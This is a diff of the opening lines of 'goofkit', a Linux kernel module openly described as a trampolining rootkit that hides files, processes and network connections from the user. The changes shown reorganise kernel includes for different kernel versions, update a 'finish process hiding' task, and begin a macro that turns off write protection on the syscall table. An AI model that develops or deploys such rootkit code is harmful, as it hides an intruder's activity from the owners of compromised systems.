@@ -3,9 +3,10 @@ Project: goofkit
 Author: Jack "Hulto" McKenna & Rayne Cafaro
 Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
 
-Task:
-## Hide processes ##
+Tasks:
+## Finish process hiding ##
 */
+
 
 #include <linux/version.h>
 #include <linux/err.h>
@@ -16,21 +17,24 @@ Task:
 #include <linux/dirent.h>
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
-#include <linux/proc_fs.h>
-#include <asm/uaccess.h>
-#include <linux/namei.h>
 #include <linux/fs.h>
 #include <linux/utsname.h>
 #include <linux/file.h>
 #include <linux/fdtable.h>
 #include <linux/slab.h>
-#include <linux/proc_ns.h>
 #include <linux/utsname.h>
 #include <asm/pgtable.h>
 #include <linux/vmalloc.h>
-#include <linux/inet.h>
-#include <net/ip.h>
-#include <linux/socket.h>
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
+	#include <linux/proc_ns.h>
+#else
+	#include <linux/proc_fs.h>
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
+	#include <asm/uaccess.h>
+#endif
 
 //Allow and disallow writing to syscall
 #define DISABLE_W_PROTECTED_MEMORY \
